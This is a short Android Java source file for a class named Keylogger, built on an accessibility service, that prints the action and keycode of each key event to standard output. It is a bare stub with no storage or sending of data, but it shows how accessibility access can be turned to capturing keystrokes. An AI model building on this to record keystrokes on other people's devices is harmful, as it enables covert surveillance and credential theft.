package com.example.myapplication;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

public class Keylogger extends AccessibilityService {

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        System.out.println(String.format("action = %s, keycode = %s", event.getAction(), event.getKeyCode()));
        return super.onKeyEvent(event);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
    }

    @Override
    public void onInterrupt() {
    }
}
